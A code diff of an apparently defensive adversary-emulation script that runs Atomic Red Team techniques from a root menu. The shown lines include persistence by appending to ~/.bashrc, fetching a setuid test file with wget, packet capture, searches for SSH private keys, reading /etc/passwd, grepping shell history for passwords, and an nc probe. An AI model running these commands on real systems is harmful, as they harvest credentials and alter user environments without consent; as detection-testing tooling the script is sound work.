@@ -5,6 +5,7 @@ import sys
 import os
 import subprocess
 import time
+import keyboard
 
 #Create a banner
 banner = """
@@ -39,12 +40,11 @@ banner = """
 
 if not os.geteuid()==0:
     sys.exit('This script must be run as root! Try sudo python atomic-automator.py')
-    
+
 loop=True
 while loop:
     print(banner)
     x = input ("Select An Option:")
- #Exection   
     if x == 1:
         os.system("echo So long, and thanks for all the fish! >> /tmp/art-fish.txt")
         time.sleep(1)
@@ -67,7 +67,7 @@ while loop:
         time.sleep(1)
         print "ALL DONE Execution - RETURNING TO MAIN MENU"
         time.sleep(2)
-#Persistance 
+
     elif x == 2:
         print "Executing T1156 - BashRC"
         os.system("echo Hello Atomic-Test >> ~/.bashrc")
@@ -86,7 +86,7 @@ while loop:
         os.system("clear")
         print "ALL DONE Persistance - RETURNING TO MAIN MENU"
         time.sleep(1)
-#PrivEscalation  
+ 
     elif x == 3:
         print "Executing T1166 - Setuid and Setgid"
         os.system("wget -P /tmp/ https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1166/hello.c")
@@ -105,7 +105,7 @@ while loop:
         print "ALL DONE Privilege Escalation - RETURNING TO MAIN MENU"
         time.sleep(2)
         os.system("clear")
- #Defense Evasion
+
     elif x == 4:
         print "Executing T1009 - Binary Padding"
         os.system("touch /tmp/pad.txt")
@@ -120,7 +120,7 @@ while loop:
         time.sleep(1)
         print ("Executing T1107 - File Deletion")
         os.system("rm -rf /tmp/art1.sh")
-#CredAccess
+
     elif x == 5:
         print ("Executing T1040 - Network Sniffing")
         os.system("tcpdump -c 5 -i en0 >> /tmp/loot.txt")
@@ -133,7 +133,7 @@ while loop:
         os.system("find / -name id_rsa >> /tmp/loot.txt")
         os.system("find / -name id_dsa >> /tmp/loottxt")
         time.sleep(1)
-#Discovery
+
     elif x == 6:
         print ("Executing T1087 - Account Discovery")
         os.system("cat /etc/passwd >> /tmp/loot.txt")
@@ -141,9 +141,10 @@ while loop:
         os.system("grep 'x:0:' /etc/passwd >> /tmp/loot.txt")
         print "Executing T1139 - Bash History"
         os.system("cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' >> /tmp/loot.txt")
+        os.system("id >> /tmp/loot.txt")
         os.system("find / -name id_rsa >> /tmp/rsa.txt")
         os.system("find / -name id_dsa >> /tmp/dsa.txt")
-        os.system("id >> /tmp/loot.txt")
+        os.system("clear")
         time.sleep(1)
         print ("Executing T1217 - Browser Bookmark Discovery")
         os.system("find / -path *.mozilla/firefox/*/places.sqlite -exec echo {} >> /tmp/firefox-bookmarks.txt \;")
@@ -151,7 +152,8 @@ while loop:
         os.system("cat /etc/mtab >> /tmp/loot.txt")
         time.sleep(1)
         print ("Executing T1046 - Network Service Scanning")
-        os.system("nc -nv 192.168.11.1 80 >> /tmp/loot.txt")
+        os.system("nc -nv 192.168.11.1 80 >> /tmp/loot.txt \r")
+        keyboard.press_and_release('enter') 
         print("Executing T1201 - Password Policy Discovery")
         os.system("cat /etc/security/pwquality.conf >> /tmp/loot.txt")
         os.system("cat /etc/login.defs >> /tmp/loot.txt")
@@ -183,7 +185,7 @@ while loop:
         print("Executing T1033 - System Owner/User Discovery")
         os.system("users >> /tmp/loot.txt")
         time.sleep(2)
-#Exfil
+
     elif x == 7:
         print ("Executing T1002 - Data Compressed")
         os.system("gzip -f /tmp/loot.txt")
@@ -196,12 +198,12 @@ while loop:
         os.system("dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1")
         os.system("split -b 5000000 /tmp/victim-whole-file")
         time.sleep(2)
-#c&c
+
     elif x == 8:
         print ("Executing T1132 - Data Encoding")
         os.system("echo -n 555-555-5555 | base64 >> loot.txt")
         time.sleep(1)
-#atomicbomb
+
     elif x == 9:
         os.system("echo So long, and thanks for all the fish! >> /tmp/art-fish.txt")
         time.sleep(1)
@@ -290,7 +292,7 @@ while loop:
         os.system("cat /etc/mtab >> /tmp/loot.txt")
         time.sleep(1)
         print ("Executing T1046 - Network Service Scanning")
-        os.system("nc -nv 192.168.11.1 80 >> /tmp/loot.txt")
+        os.system("nc -nv 192.168.11.1 80 >> /tmp/loot.txt \r \n")
         print("Executing T1201 - Password Policy Discovery")
         os.system("cat /etc/security/pwquality.conf >> /tmp/loot.txt")
         os.system("cat /etc/login.defs >> /tmp/loot.txt")
@@ -335,7 +337,7 @@ while loop:
         print ("Executing T1132 - Data Encoding")
         os.system("echo -n 555-555-5555 | base64 >> loot.txt")
         time.sleep(1)
-        print ("ALL DONE - RETURNING TO MAIN MENU2")
+        print ("ALL DONE - RETURNING TO MAIN MENU")
 
     elif x == 10:
         print("Cleaning this bad mother up")
